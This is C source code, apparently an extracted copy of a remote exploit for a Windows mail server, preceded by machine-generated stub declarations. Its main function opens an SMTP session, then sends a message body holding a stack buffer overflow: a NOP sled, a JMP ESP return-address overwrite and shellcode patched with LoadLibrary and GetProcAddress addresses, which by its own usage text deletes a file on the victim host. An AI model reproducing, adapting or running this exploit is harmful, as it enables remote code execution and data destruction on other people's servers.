#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_4__   TYPE_2__ ;
typedef  struct TYPE_3__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  u_short ;
struct hostent {int /*<<< orphan*/  h_length; int /*<<< orphan*/  h_addr; int /*<<< orphan*/  h_addrtype; } ;
typedef  int /*<<< orphan*/  addr ;
typedef  int /*<<< orphan*/  WSADATA ;
typedef  int /*<<< orphan*/  WORD ;
struct TYPE_3__ {int s_addr; } ;
struct TYPE_4__ {TYPE_1__ sin_addr; int /*<<< orphan*/  sin_family; int /*<<< orphan*/  sin_port; } ;
typedef  int /*<<< orphan*/  SOCKET ;
typedef  TYPE_2__ SOCKADDR_IN ;
typedef  int /*<<< orphan*/  LPSOCKADDR ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 char* CONTENT ; 
 int FALSE ; 
 scalar_t__ GetProcAddress ; 
 int /*<<< orphan*/  INVALID_SOCKET ; 
 unsigned int JMPESP_ADR ; 
 scalar_t__ LoadLibrary ; 
 int /*<<< orphan*/  MAKEWORD (int,int /*<<< orphan*/ ) ; 
 int MAXBUF ; 
 size_t RETADR ; 
 scalar_t__ SMTP_PORT ; 
 scalar_t__ SOCKET_ERROR ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int STACK_BYTES ; 
 char* TARGET_FILE ; 
 scalar_t__ WSAStartup (int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  closesocket (int /*<<< orphan*/ ) ; 
 char* cmdbuf ; 
 scalar_t__ connect (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int) ; 
 char* exploit_code ; 
 struct hostent* gethostbyname (char*) ; 
 int /*<<< orphan*/  htons (int /*<<< orphan*/ ) ; 
 int inet_addr (char*) ; 
 int /*<<< orphan*/  memcpy (char*,char*,char) ; 
 int /*<<< orphan*/  memset (char*,int,int) ; 
 int /*<<< orphan*/  printf (char*,...) ; 
 int /*<<< orphan*/  recv (int /*<<< orphan*/ ,char*,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  send (int /*<<< orphan*/ ,char*,char,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  send_smtpcmd (int /*<<< orphan*/ ,char*) ; 
 int /*<<< orphan*/  socket (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  sprintf (char*,char*,char*) ; 
 int /*<<< orphan*/  strcat (char*,char*) ; 
 char strlen (char*) ; 

main(int argc,char *argv[])
{
    SOCKET               sock;
    SOCKADDR_IN          addr;
    WSADATA              wsa;
    WORD                 wVersionRequested;
    unsigned int         ip,p1,p2;
    char                 buf[MAXBUF],packetbuf[MAXBUF+1000];
    struct hostent       *hs;

    if (argc<3){
        printf("This exploit removes \"%s\" on the victim host",TARGET_FILE);
        printf("usage: %s SMTPserver Mailaddress\n",argv[0]);
        return -1;
    }
    wVersionRequested = MAKEWORD( 2, 0 );
    if (WSAStartup(wVersionRequested , &wsa)!=0){
        printf("Winsock Initialization failed.\n"); return -1;
    }
    if ((sock=socket(AF_INET,SOCK_STREAM,0))==INVALID_SOCKET){
        printf("Can not create socket.\n"); return -1;
    }
    addr.sin_family     = AF_INET;
    addr.sin_port       = htons((u_short)SMTP_PORT);
    if ((addr.sin_addr.s_addr=inet_addr(argv[1]))==-1){
            if ((hs=gethostbyname(argv[1]))==NULL){
                printf("Can not resolve specified host.\n"); return -1;
            }
            addr.sin_family = hs->h_addrtype;
            memcpy((void *)&addr.sin_addr.s_addr,hs->h_addr,hs->h_length);
    }
    if (connect(sock,(LPSOCKADDR)&addr,sizeof(addr))==SOCKET_ERROR){
        printf("Can not connect to specified host.\n"); return -1;
    }
    recv(sock,packetbuf,MAXBUF,0);
    printf("BANNER    : %s\n",packetbuf);

    send_smtpcmd(sock,"EHLO mail.attcker-host.net\r\n");
    send_smtpcmd(sock,"MAIL FROM: <attacker@attacker-host.net>\r\n");
    sprintf(packetbuf,"RCPT TO: <%s>\r\n",argv[2]);
    send_smtpcmd(sock,packetbuf);
    send_smtpcmd(sock,"DATA\r\n");
    
    memset(buf,0x90,MAXBUF); buf[MAXBUF]=0;
    ip=JMPESP_ADR;
    buf[RETADR  ]=ip&0xff;
    buf[RETADR+1]=(ip>>8)&0xff;
    buf[RETADR+2]=(ip>>16)&0xff;
    buf[RETADR+3]=(ip>>24)&0xff;

    strcat(exploit_code,cmdbuf);
    strcat(exploit_code,TARGET_FILE);
    p1=(unsigned int)LoadLibrary;
    p2=(unsigned int)GetProcAddress;
    exploit_code[0x0d]=p1&0xff;
    exploit_code[0x0e]=(p1>>8)&0xff;
    exploit_code[0x0f]=(p1>>16)&0xff;
    exploit_code[0x10]=(p1>>24)&0xff;
    exploit_code[0x1e]=p2&0xff;
    exploit_code[0x1f]=(p2>>8)&0xff;
    exploit_code[0x20]=(p2>>16)&0xff;
    exploit_code[0x21]=(p2>>24)&0xff;
    exploit_code[0x2a]=strlen(TARGET_FILE);
    memcpy(buf+RETADR+4+STACK_BYTES,exploit_code,strlen(exploit_code));

    sprintf(packetbuf,CONTENT,buf);
    send(sock,packetbuf,strlen(packetbuf),0);
    send_smtpcmd(sock,".\r\n");
    closesocket(sock);
    printf("Done.\n");
    return FALSE;
}